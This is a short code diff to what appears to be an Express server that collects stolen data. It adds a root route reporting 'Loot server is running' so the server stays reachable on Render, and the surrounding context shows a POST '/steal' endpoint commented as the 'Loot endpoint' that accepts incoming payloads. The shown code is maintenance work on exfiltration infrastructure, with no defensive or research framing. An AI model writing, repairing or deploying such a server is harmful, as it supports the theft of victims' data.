@@ -63,6 +63,16 @@ if (fs.existsSync(certFile) && fs.existsSync(keyFile)) {
 }
 
 // --- Routes ---
+
+// Root route to fix 404 on Render
+app.get('/', (req, res) => {
+    res.status(200).json({ 
+        status: 'online', 
+        message: 'Loot server is running' 
+    });
+});
+
+// Loot endpoint
 app.post('/steal', (req, res) => {
     let payload = req.body;
 
